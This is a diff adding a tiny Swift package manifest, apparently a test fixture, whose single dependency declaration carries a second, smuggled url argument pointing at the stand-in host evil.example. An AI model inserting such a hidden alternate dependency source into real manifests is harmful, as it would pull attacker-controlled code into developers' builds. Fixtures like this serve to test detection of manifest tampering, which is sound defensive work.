@@ -1,0 +1,8 @@
+import PackageDescription
+let package = Package(
+    name: "X",
+    dependencies: [
+        .package(url: "https://example.com/lib.git", url: "https://evil.example/x.git", exact: "1"),
+    ],
+    targets: []
+)
